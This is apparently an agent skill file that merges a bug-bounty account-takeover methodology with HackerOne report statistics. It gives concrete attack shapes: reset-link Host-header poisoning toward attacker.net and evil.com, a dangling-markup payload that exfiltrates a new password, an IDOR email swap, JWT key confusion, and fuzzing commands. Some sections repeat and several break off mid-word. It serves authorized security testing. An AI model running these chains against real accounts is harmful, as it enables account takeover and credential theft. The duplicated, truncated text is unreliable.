---
name: bbhunt-account-takeover
description: "Use when multiple primitives combine to control another account: reset poisoning, OAuth linking, session issues, token leakage, or email change. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Account Takeover Chains — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Do not hunt 'ATO' directly — first identify the concrete primitive (reset, OAuth, session, XSS, CSRF, IDOR).
2. Establish attacker and victim accounts and the exact action the victim does or does not take.
3. Enumerate every identity-binding step: email, token, session, OAuth subject, and device remember.
4. Demonstrate control of the victim's session or authentication material without their credentials or unusual actions.
5. Minimize the victim interaction; a chain requiring the victim to click an attacker link is still valid, one requiring credentials is not.
6. Prove the consequence (access to victim data/actions) and redact all victim data in evidence.

### Signals

- Identity is determined by a client-supplied email, ID or token
- Reset/email-change/OAuth flows that can be influenced
- Any primitive that changes authentication state for another identity

### Kill criteria

- Requires the victim's password or second factor.
- Only changes data on an account you already control.
- Victim must take unusual, security-unaware actions beyond a normal link click.

### Escalation chains

- Open redirect -> OAuth code -> ATO.
- Reset poisoning -> token capture -> ATO.
- Auth bypass -> session issuance -> ATO.

### Veteran tip

ATO is usually the *escalation* from another class — load the root-cause class skill first, then this one for the final proof.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Enumerate ATO primitives: reset, email change, OAuth linking, OTP, session fixation.
- Test email-change flows for missing verification, race, and token leakage.
- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.
- Test account merging/linking and pre-registration takeover.

### Deeper checklist

- Enumerate ATO primitives: password reset, email change, OAuth linking, OTP, session fixation.
- Test email-change flows for missing verification, race conditions, and token leakage.
- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.
- Test account merging/linking and pre-registration takeover.
- Chain lower-severity bugs (XSS, CSRF, IDOR) into ATO.
- Demonstrate login to a victim account you control, with a clear step-by-step PoC.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Enumerate every recovery path, not just `/forgot-password`: `/reset-password`, `/password/reset`, `/api/public/passwords/`, `/change-email`, `/verify-email`, `/confirm`, `/activate`, `/magic-link`. The 2025 Beek Labs case ($3,000, 1.3M users) found a forgotten reset API only by reversing references out of the JS bundle — grep bundles for `reset_password`, `token`, `authenticationToken`, `pin`, `jobId`.
- For each reset request, record which values build the absolute link. Probe `Host`, `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, and dual `Host` headers. PortSwigger's canonical lab uses `X-Forwarded-Host: YOUR-ID.exploit-server.net` on `POST /forgot-password`.
- Identify the token carrier: query param (`temp-forgot-password-token`, `reset_password_token`), body field, cookie, or fragment. Note whether the token is also echoed in the JSON response body — Beek Labs saw full PII + reset token + session token in a `201 Created`.
- Look for client-controlled URL parameters in the reset call: `reset_password_path`, `redirect_url`, `base_uri`, `callback`, `return_to`. A user-controlled `reset_password_path` is an independent poisoning primitive even when Host is pinned (CVE-style "absolute URL link poisoning").
- Map the whole state machine: request → email → token validation → form submit → token destruction. Check each hop for binding: is the token tied to an account, a session, an IP, a timestamp?
- Check "remember me" cookies for predictable concatenation

### Signals and surfaces

### Signal

- Reports: **262** · paid: **39**
- Median bounty **$1,500** · p90 **$10,500** · max **$35,000** · total **$144,138**
- Median upvotes **36**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $37,450 | 1088 |
| HackerOne | 6 | $22,500 | 2145 |
| Uber | 6 | $21,000 | 787 |
| Mail.ru | 27 | $14,550 | 1730 |
| TikTok | 4 | $12,000 | 724 |
| Superhuman (formerly Grammarly) | 3 | $10,500 | 628 |
| Chaturbate | 2 | $8,000 | 67 |
| LY Corporation | 2 | $5,000 | 708 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`reset` `email` `verify` `oauth` `link` `otp` `mfa` `session`

### Techniques, payloads and bypasses

### Payloads & probes

- Host header -> `Host: evil.com` in reset request
- Email -> `victim@example.com` with unicode/plus/dot variants
- OAuth -> link attacker provider to victim email
- OTP -> brute force, reuse, response leakage

### Bypass tricks

- Chain XSS/CSRF/IDOR into the ATO path.
- Abuse email normalization and case sensitivity.
- Race the email-change confirmation.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Takeover an account that doesn't have a Shopify ID and more** — `#867513` · Shopify · $0 · ▲3006
  > Save your own staff page and copy the CURL request by using browser inspection
- **Account Takeover via Password Reset without user interactions** — `#2293343` · GitLab · $35,000 · ▲989
  > Forward the requests and you should get an email containing the reset link that was send to both emails (``victim@gmail.com`` and ``attacker@gmail.com``) .
- **Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** — `#737140` · Slack · $0 · ▲870
  > The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method.
- **Bypassing Digits origin validation which leads to account takeover** — `#129873` · X / xAI · $0 · ▲619
  > In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk host").search(t.origin)`, which is the same as `-1 !== "https://www.digits.com".search(t.origin)`.
- **Request smuggling on admin-official.line.me could lead to account takeover** — `#740037` · LY Corporation · $0 · ▲565
  > The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the imp

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `victim@ato.com` |
| 3× | `attacker@example.com` |
| 3× | `@import` |
| 2× | `GET https://<URL> HTTP/1.1` |
| 2× | `demo-member@hackerone.com` |
| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |
| 2× | `badca7@wearehackerone.com` |
| 2× | `application%5Bid%5D` |
| 2× | `check_alter_user()` |
| 2× | `$regex` |
| 2× | `loadDataWithBaseURL()` |
| 2× | `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$` |
| 2× | `<input>` |
| 1× | `user[email]":"victim@gmail.com` |
| 1× | `victim@gmail.com` |
| 1× | `attacker@gmail.com` |
| 1× | `GET / HTTP/1.1 / Transfer-Encoding : chunked / Host: slackb.com / User-Agent: Smuggler/v1.0 / Content-Length: 83 / 0 / GET <URL> HTTP/1.1 /` |
| 1× | `https://<URL>` |
| 1× | `Burp->Burp Collaborator Client` |
| 1× | `host: slackb.com , Port: 443 (SSL)` |

### Bypassing Digits origin validation which leads to account takeover

`#129873` · X / xAI · $0 · n/a · 2020-06-24 · ▲619
> Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. Detail In Digits architecture, the data communication channel between Digits and customer's site relies on postMessage() .

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Basic poisoning: `POST /forgot-password` with `username=carlos` and `Host: attacker.net` (or `X-Forwarded-Host: attacker.net`) → read the stolen `temp-forgot-password-token` from the attacker access log → replay on the *real* domain reset URL.
- Header bypass matrix from a 2025 €900 0-click writeup: `X-Forwarded-Host`; inverted Host pair (`Host: evil.com` + `X-Forwarded-Host: redacted.com`); `X-Forwarded-For` swap/flip; `Host: evil.com.redacted.com`; `Host: redacted.com.evil.com`; absolute-form target `POST / https://endpoint/ HTTP/1.1` with `Host: http://evil.com` to get 200/302 where plain form gave 403/404.
- Broken-logic variant: request your own reset, open the form, then in `POST /forgot-password?temp-forgot-password-token=...` delete the token value from both URL and body and set `username=carlos` — if the app still resets, the token is never revalidated at submit time.
- 0-click email-parameter swap: intercept the final password-change POST, change only the `email` field attacker → victim; a trailing opaque "authenticity" param may be decorative. A `200 {"status":true}` plus successful victim login confirms it.
- Dangling-markup injection when the Host is numeric-only validated but an arbitrary port is accepted: `Host: target.net:'<a href="//attacker.net/?` breaks out of a single-quoted string in the email HTML and exfiltrates the rest (including the new password) via `GET /?...` when the mail renderer/AV scanner fetches the link (PortSwigger dangling-markup lab).
- Response-body token e

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- Reflected header ≠ stolen token. Require an actual token-bearing request arriving at your Collaborator/exploit-server log (`GET /reset?token=...`), then prove the token works on the canonical domain by completing the reset and logging in.
- Always use two self-controlled accounts (A attacker, B victim): start from A, end with a live authenticated session as B. Never target real users.
- Distinguish "token leaked" from "token reusable": a stolen token that is single-use or bound to IP/UA/session may die — confirm the reset completes end-to-end, not just that the email URL changed.
- For response-body leaks, show the exact JSON keys and a clean login as the victim; PII exposure alone is a separate finding, not automatically ATO.
- Beware AV-link-scanner false positives: a click inside an email client is not real victim interaction unless the app's own mail renderer fetches it; document who fetched the poisoned URL.
- Header-injection-only "the email contained evil.com" with a 403/404 or dead link is Informational. Tokens should expire quickly and be destroyed immediately after use; a token that still works later strengthens the finding.
- Severity gate: 0-click (parameter swap only) = Critical; 1-click poisoning with a real token captured and reset completed = Critical; enumeration-only or unbound-link-only = Low/Informational. Redact session cookies and other-user PII in the PoC.

- Confirm the stolen token is actually associated with the victim, not your own: the Collaborator request should carry th

### Escalation and related chains

### Escalation chains

- Reset poisoning -> ATO.
- XSS -> cookie theft -> ATO.
- OAuth link -> ATO.

### Related Skills & Chains

- **`idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`mfa-and-passwords`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`oauth-oidc`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `subdomain-takeover` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → 

### Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the reques

### Tools and wordlists

### Tools

`Burp` · `Turbo Intruder` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_account-takeover.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_account-takeover.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_account-takeover.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_account-takeover.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Use Nuclei for exposed tokens and takeover fingerprints, then chain reset/OAuth/email-change primitives manually.

```sh
nuclei -u https://target -tags takeover,auth-bypass,jwt \
       -severity low,medium,high,critical -rl 40 -o nuclei_account-takeover.txt
nuclei -u https://target -t ~/nuclei-templates/http/takeovers \
       -rl 40 -o nuclei_account-takeover_takeovers.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens/generic/jwt-token.yaml \
       -rl 40 -o nuclei_account-takeover_jwt-token.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-account-takeover`
- `hunting` — `account-takeover`
- `cbh` — `hunt-ato`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
